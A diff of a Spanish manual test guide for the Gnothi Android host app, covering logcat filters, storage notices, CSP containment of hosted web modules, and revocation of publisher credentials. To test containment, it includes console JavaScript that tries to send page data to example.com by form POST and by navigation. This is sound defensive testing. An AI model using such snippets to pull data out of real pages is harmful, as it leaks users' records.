@@ -120,14 +120,22 @@ un `assetlinks.json` con la huella de firma. Sin la aprobación, tocar «Agregar
 Dejá una segunda terminal mirando por dentro. **Son tres tags y dicen cosas distintas:**
 
 ```bash
-adb logcat -s GNOTHI:I gnothi:I modulo:examenes:I modulo:compras:I modulo:cargas:I modulo:dealership:I
+adb logcat -s GNOTHI:I gnothi:I modulo:I
 ```
 
 - `GNOTHI` (mayúscula) — el Host: catálogo, consentimiento, comprobaciones.
 - `gnothi` (minúscula) — el alta y el cartero. **Es fácil perdérselo**: casi todo lo interesante
   de estas pruebas sale acá.
-- `modulo:<módulo>` — la consola de ese módulo, incluidas las violaciones de CSP. Hay uno por
-  módulo porque cada uno corre en su propio origen.
+- `modulo` — la consola de los módulos, incluidas las violaciones de CSP. **El nombre del
+  módulo va al principio del mensaje**, no en el tag: `examenes: …`, `compras: …`. Para ver uno
+  solo, `adb logcat -s modulo:I | grep '^.*examenes:'`.
+
+> **Por qué un solo tag y no uno por módulo.** Este filtro antes decía
+> `modulo:examenes:I modulo:compras:I …` y **no podía funcionar**: `-s` lee cada término como
+> `TAG:PRIORIDAD`, así que `modulo:examenes:I` se interpreta como tag `modulo` con prioridad
+> `examenes`. Un término inválido hace que logcat rechace **toda** la lista, no sólo ese, así
+> que no salía ni `GNOTHI` y la app parecía muda. Un tag con dos puntos no se puede expresar en
+> `-s`, y por eso el nombre del módulo se mudó al mensaje.
 
 ---
 
@@ -240,7 +248,7 @@ El alta son **dos actos, y la persona decide en el medio**:
 |---|---|
 | El logo de **Supermercado La Guaria** sobre su verde, su nombre, y debajo *Agregar Mis compras* | la marca sale del `manifest.webmanifest` del bundle; el nombre, de lo que el manifiesto **declara** de sí mismo |
 | **Qué va a poder contestar** — las consultas con su descripción | las `tools` del manifiesto |
-| **Dónde va a vivir tu registro** — `/data/user/0/…/files/journals/compras` | lo decide **Gnothi** |
+| **Dónde se va a guardar, en tu teléfono** — `/data/user/0/…/files/journals/compras`, con «Es tuyo. Gnothi se lo administra a esta institución, no se lo lleva» | lo decide **Gnothi** |
 | **Con quién va a hablar** — `http://127.0.0.1:8101/cliente/1` | lo declara la institución, lo **fija** Gnothi |
 | *El bundle lo sirvió 127.0.0.1* | de dónde se bajó de verdad |
 
@@ -314,13 +322,13 @@ Y arriba, el aviso que solo aparece hospedado:
 
 | módulo | el aviso dice |
 |---|---|
-| `examenes` | *Se está guardando en Gnothi.* Tu expediente vive en el dispositivo, en la carpeta que Gnothi le dio a este laboratorio… |
-| `compras` | *Se está guardando en Gnothi.* Tu registro vive en el dispositivo, en la carpeta que Gnothi le dio a este supermercado… |
-| `cargas` | *Se está guardando en Gnothi.* Tu bitácora vive en el dispositivo, en la carpeta que Gnothi le dio a esta estación… |
-| `dealership` | *It is being saved in Gnothi.* Your record lives on this device, in the folder Gnothi gave this dealership… |
+| `examenes` | *Se está guardando en este teléfono.* Tu expediente es tuyo y está acá: Gnothi le dio a este laboratorio una carpeta en tu teléfono… |
+| `compras` | *Se está guardando en este teléfono.* Tu registro es tuyo y está acá: Gnothi le dio a este supermercado una carpeta en tu teléfono… |
+| `cargas` | *Se está guardando en este teléfono.* Tu bitácora es tuya y está acá: Gnothi le dio a esta estación una carpeta en tu teléfono… |
+| `dealership` | *It is being saved on this phone.* Your record is yours and it is right here: Gnothi gave this dealership a folder on your phone… |
 
 **Los números tienen que ser los mismos que en P1.** Es el mismo binario leyendo su propio
-journal; lo único que cambió es dónde vive.
+journal; lo único que cambió es en qué carpeta está el archivo.
 
 **Y lo que NO tiene que aparecer:** el selector de «elegí dónde guardar». Hospedado no hay nada
 que elegir ni permiso que pedir — el destino es de Gnothi. Si aparece, el módulo no se enteró de
@@ -402,21 +410,169 @@ dando 6, 2, 4 y 6 respectivamente. Los cuatro journals limpios.
 Es la prueba que vuelve **falsable** todo lo anterior: en la **misma corrida** el módulo intenta
 alcanzar al publicador y el motor se lo niega, mientras Gnothi lo alcanza sin problema.
 
-> **Esta no se ejecuta sola.** El módulo hospedado nunca intenta salir a la red —usa el puente—,
-> así que no hay nada que negar espontáneamente. Se midió el **2026-09-03** agregando una sonda
-> temporal al módulo que hacía `fetch` contra el publicador. Resultado, en la misma corrida:
-> el módulo denegado por CSP, Gnothi respondiendo. Para repetirla hay que volver a poner la sonda.
+> **La mitad SÍ se ejecuta sola, y esto es una corrección: antes acá decía que nada se negaba
+> espontáneamente.** Se negaba. El PWA de Blazor intenta registrar su service worker en cada
+> carga, y la política se lo deniega sin que nadie toque nada. Medido el **2026-09-07** apenas
+> instalar `examenes`, con `adb logcat -s modulo:I`:
+>
+> ```
+> examenes: Creating a worker from 'https://examenes.gnothi.local/app/service-worker.js'
+> violates the following Content Security Policy directive: "worker-src 'none'". The
+> action has been blocked. (35)
+> examenes: Uncaught (in promise) SecurityError: Failed to register a ServiceWorker
+> ```
+>
+> Eso prueba, **con cero preparación**, que la política llega al módulo y que el motor la
+> aplica. Y la denegación es benigna: en la misma corrida `resumen` contestó 122 bytes con
+> `examenes: 11`, así que el módulo funciona igual sin su service worker.
+>
+> **Lo que todavía pide la sonda** es la otra mitad: que no pueda alcanzar al *publicador*. Eso
+> es `connect-src 'self'`, y ahí sí el módulo hospedado nunca lo intenta —usa el puente—, así
+> que no hay nada que negar. Se midió el **2026-09-03** agregando una sonda temporal que hacía
+> `fetch` contra el publicador: el módulo denegado por CSP y Gnothi respondiendo, en la misma
+> corrida. Para repetir esa mitad hay que volver a poner la sonda.
 
-Lo que **sí** se puede mirar ahora es la política que se le sirve, en `ServidorDelBundle`
-([ModulosWeb.cs](ModulosWeb.cs)): `connect-src 'self'`, con el hash del script inline calculado
-al servir. Si ahí dijera `*`, no habría contención.
+Lo que **sí** se puede mirar ahora es la política que se le sirve, en `BundleServer`
+([../Gnothi.Movil/BundleServer.cs](../Gnothi.Movil/BundleServer.cs)): `connect-src 'self'`, con
+el hash del script inline calculado al servir. Si ahí dijera `*`, no habría contención.
 
-Cuando la sonda está puesta, la violación aparece bajo `modulo:examenes`:
+Y ahora vive en `Gnothi.Movil`, o sea que **es literalmente la misma cadena que sirve iOS**,
+calculada por el mismo código. Antes era `ServidorDelBundle` en `ModulosWeb.cs`, de este
+proyecto.
+
+Cuando la sonda está puesta, la violación aparece bajo el tag `modulo`, con el nombre del
+módulo al principio del mensaje:
 
 ```
-Refused to connect to 'http://127.0.0.1:8095/...' because it violates the following
-Content Security Policy directive: "connect-src 'self'"
+examenes: Refused to connect to 'http://127.0.0.1:8095/...' because it violates the
+following Content Security Policy directive: "connect-src 'self'"
 ```
+
+#### La denegación ya no es muda: Gnothi la cuenta
+
+Desde el **2026-09-07** cada rechazo del motor le llega a Gnothi **como un hecho**, no como una
+línea de consola entre otras. Gnothi inyecta un vigía en el documento que sirve —está en
+`BundleServer`, así que Android e iOS lo tienen del mismo código— y ese vigía escucha
+`securitypolicyviolation` y lo manda por el puente.
+
+Se ve así, bajo el tag `gnothi` y **no** bajo `modulo`:
+
+```
+examenes: REFUSED by worker-src -- https://examenes.gnothi.local/app/service-worker.js
+          (from https://examenes.gnothi.local/app/:35); 1 so far
+```
+
+Trae **la directiva, qué se bloqueó, de dónde salió y la cuenta**. Esa cuenta es lo que hace la
+diferencia entre una política declarada y una que se sabe que está aplicando: un módulo cuya
+cuenta nunca se mueve o se porta bien **o no lo está mirando nadie**, y hasta ahora no había
+forma de distinguir esos dos casos.
+
+**Qué mirar en cada corrida:** abrí un módulo y fijate si aparece **alguna** línea `REFUSED`, sin
+esperar una directiva concreta. Si no aparece ninguna, confirmalo con el intento del formulario de
+más abajo, que **sí es determinista** — si ése tampoco produce una línea, ahí el vigía no está
+corriendo.
+
+> **No esperes una directiva en particular, y esto costó una corrección.** El guion decía *«tiene
+> que aparecer al menos el `worker-src`»*, y **[MEDIDO 2026-09-07]** que ese testigo se mueve:
+>
+> | | directiva que aparece |
+> |---|---|
+> | dealership, antes del arreglo del hash CRLF | **`script-src-elem`** — el script de registro estaba bloqueado y nunca pedía el worker |
+> | dealership, después del arreglo | **`worker-src`** — el script corre y se bloquea el worker |
+> | en iOS, sobre un esquema propio | **[RAZONADO]** puede no aparecer ninguna: WebKit no expone `navigator.serviceWorker` ahí |
+>
+> O sea que la denegación del service worker depende de la plataforma, del formato del bundle y de
+> si el hash coincide. **El testigo bueno es el formulario**, que lo provocás vos y da siempre.
+
+> Esto **no** va al journal, a propósito: el journal es el registro de la persona tal como lo
+> escribe la institución, y una violación de contención es de Gnothi. Meterla ahí sería poner la
+> opinión del Host adentro del libro de la institución.
+
+#### Las otras dos salidas, y cómo probarlas de verdad
+
+`connect-src` cubre el `fetch`, pero **no es la única forma de sacar datos de una página**. Hay
+dos más, y las dos estaban abiertas hasta el **2026-09-07**:
+
+| salida | qué la gobierna | ¿hereda de `default-src`? |
+|---|---|---|
+| **`<form action="https://ajeno" method="post">`** | `form-action` | **no** — por eso faltaba |
+| **`window.location = 'https://ajeno/?d=…'`** | **ninguna directiva existe** | — |
+
+La primera se cerró con `form-action 'self'` en la cadena compartida; la segunda con
+`ShouldOverrideUrlLoading` en `BundleServerClient`, que rechaza todo host que no sea el del
+módulo y **lo loguea**.
+
+**Y esta prueba SÍ se puede correr entera, sin sonda y sin tocar el módulo**, porque en Debug el
+WebView es inspeccionable. Con el escenario arriba y un módulo abierto:
+
+```bash
+adb shell cat /proc/net/unix | grep -o 'webview_devtools_remote_[0-9]*' | sort -u
+adb forward tcp:9222 localabstract:webview_devtools_remote_<pid>
+```
+
+Después, `chrome://inspect` en Chrome de escritorio muestra los dos WebViews —el módulo en
+`https://<módulo>.gnothi.local/app/` y la cáscara en `file:///android_asset/ui.html`— y desde su
+consola:
+
+```javascript
+// intento A · el formulario
+var f = document.createElement('form');
+f.method = 'POST'; f.action = 'https://example.com/collect';
+document.body.appendChild(f); f.submit();
+
+// intento B · la navegación
+window.location = 'https://example.com/?d=lo-que-sea';
+```
+
+**Qué tenés que ver.** La página **no** se mueve de su propio origen, y en el log:
+
+```
+modulo : examenes: Sending form data to 'https://example.com/collect' violates the following
+         Content Security Policy directive: "form-action 'self'". The request has been blocked.
+gnothi : examenes: navigation refused to https://example.com -- outside its own origin
+```
+
+> **MEDIDO el 2026-09-07, antes y después.** Sin el arreglo los dos intentos **salían**: la
+> página terminaba en `https://example.com/collect` y el servidor contestaba **405**, o sea que
+> el POST llegó de verdad a la red. Y la navegación terminaba en
+> `https://example.com/?d=datos-de-sonia`. No era un agujero teórico.
+
+### P6b · El botón de refresco del módulo, hospedado, va por el puente
+
+**Vale correrla porque acá vivió un bug real hasta el 2026-09-08**, y no se veía si no se tocaba
+ese botón: el módulo mostraba datos —los había traído el cartero al arrancar— así que parecía
+andar. Un síntoma ausente no es un camino probado.
+
+Con el módulo **abierto en pantalla**, inyectá algo en su publicador y tocá su botón de refresco:
+
+```bash
+curl -X POST http://127.0.0.1:8101/cliente/1/events/compra -H 'Content-Type: application/json' \
+  -d '{"numero":"VERIF-001","fecha":"2026-09-08T12:00:00","skus":["SKU-CAFE-500"],
+       "descripciones":["Cafe molido 500g"],"cantidades":[2],"preciosUnitarios":[4250],
+       "categorias":["GranosYAbarrotes"],"mesesDeGarantia":[0]}'
+```
+
+**Qué tenés que ver.** En el log, un pull **por el puente** — o sea con Gnothi haciendo el HTTP
+con SU credencial:
+
+```
+gnothi : compras: pull after=387 -> 406 bytes
+```
+
+Y en la pantalla, el contador y el total moviéndose. **[MEDIDO 2026-09-08]** en el emulador: de
+87 compras y ₡3.222.336 a **88 y ₡3.230.836** — una diferencia de ₡8.500, que es exactamente el
+total que el publicador reportó para la compra inyectada.
+
+**Mal:** cualquier error de HTTP, y en particular un **404**. Significa que el módulo intentó su
+propio HTTP contra el publicador en vez de usar el puente. Hospedado eso no puede funcionar
+nunca: `proveedor.BaseUrl` es relativa, así que la petición sale contra el propio origen del
+módulo, que sirve Gnothi y donde ese archivo no existe. Y hospedado el módulo **no tiene ni
+necesita** credencial.
+
+> **El bug, para reconocerlo si vuelve.** `Refrescar()` pedía la credencial por adelantado y sin
+> condición, y pedir la credencial es HTTP. La URL que fallaba decía `eventos/` —porque ésa es la
+> base— así que parecía la llamada de eventos y era la del token. Estaba en **compras y cargas**;
+> exámenes y dealership nunca lo tuvieron, y por eso exámenes sirve de control.
 
 ### P7 · Las consultas del módulo llegan al Host
 
@@ -470,10 +626,10 @@ borrar — lo único que deja de hacer es sincronizar.
 
 | módulo | el botón pasa a decir | el aviso |
 |---|---|---|
-| `examenes` | Ya no se actualiza | Tu registro ahora vive en Gnothi… los exámenes nuevos te llegan allá |
-| `compras` | Ya no se actualiza | Tu registro ahora vive en Gnothi… las compras nuevas te llegan allá |
-| `cargas` | Ya no se actualiza | Tu registro ahora vive en Gnothi… las cargas nuevas te llegan allá |
-| `dealership` | No longer updating | Your record now lives in Gnothi… new maintenance facts reach you there |
+| `examenes` | Ya no se actualiza | Tus exámenes nuevos ahora entran por Gnothi, en este mismo teléfono… |
+| `compras` | Ya no se actualiza | Tus compras nuevas ahora entran por Gnothi… |
+| `cargas` | Ya no se actualiza | Tus cargas nuevas ahora entran por Gnothi… |
+| `dealership` | No longer updating | New maintenance facts now arrive through Gnothi, on this same phone… |
 
 **Qué prueba:** que la marca de migración la pone **el publicador**, no el aparato. Ninguna marca
 del lado web sobrevive a «borrar datos del sitio»; ésta viaja en el sobre de eventos y certifica
@@ -481,6 +637,54 @@ que Gnothi de verdad recibió una credencial.
 
 **Mal:** si sigue en modo normal, el publicador no reconoció el device de Gnothi. Lo distingue
 por el prefijo de su clave de device.
+
+#### P8b · Y ahora el publicador REVOCA, no sólo avisa
+
+Hasta el **2026-09-07** la app suelta dejaba de sincronizar porque **decidía** obedecer la marca;
+el publicador no le quitaba nada. Con una app vieja o modificada seguía leyendo — y ahí sí hay
+dos historias divergiendo, que es lo que la marca existe para evitar (`13 §4` paso 4).
+
+Ahora la cuenta queda vinculada **con un plazo de gracia de 30 días**, que viaja en el mismo
+sobre (`account.graceUntil`), y vencido ese plazo la cuenta **es de Gnothi**. Se prueba sin
+esperar un mes, con curl contra el publicador:
+
+```bash
+curl -X POST http://127.0.0.1:8095/device/vencer-gracia
+```
+
+Y después, con el token que la app suelta ya tenía:
+
+```
+HTTP 401  {"error":"invalid_token","error_description":"la cuenta expediente/1 ya no se
+           sirve a este cliente"}
+```
+
+**Las tres puertas, y hay que probar las tres.** Cerrar una sola sería teatro: **medido en el
+cliente**, ante un 401 al leer rota la credencial, y si la rotación falla pide una concesión
+nueva con su device key. Si `/device/token` quedara abierto, el acceso vuelve en dos saltos.
+
+| puerta | qué se prueba | esperado |
+|---|---|---|
+| leer | `GET /{recurso}/1/events` con el token viejo | **401** `invalid_token` |
+| rotar | `POST /device/refresh` con su refresh | **401** |
+| pedir de nuevo | `POST /device/token` con su device key | **401** `invalid_token` |
+| y Gnothi | `GET events` con el token de Gnothi | **200**, `state=migrated` |
+
+**Y es reversible**, que es el paso 5 de `§4`:
+
+```bash
+curl -X DELETE http://127.0.0.1:8095/expediente/1/vinculo
+```
+
+La concesión de Gnothi se revoca, el vínculo se borra, y la app suelta vuelve a `active` en su
+siguiente pedido. Una decisión de la que no se puede volver no es una decisión de la persona.
+
+> **MEDIDO el 2026-09-07** contra los mocks de `examenes` y de `compras`, el ciclo entero: activa
+> → vinculada con gracia → sigue leyendo → gracia vencida → las tres puertas en 401 → Gnothi lee
+> → desvinculada → activa otra vez. Los cuatro publicadores tienen el mismo comportamiento.
+>
+> **Una app que obedece nunca llega al 401**: se entera por `account` y deja de pedir. El rechazo
+> es para la que no obedece — y por eso es un rechazo y no un aviso.
 
 ### P9 · Las mediciones
 
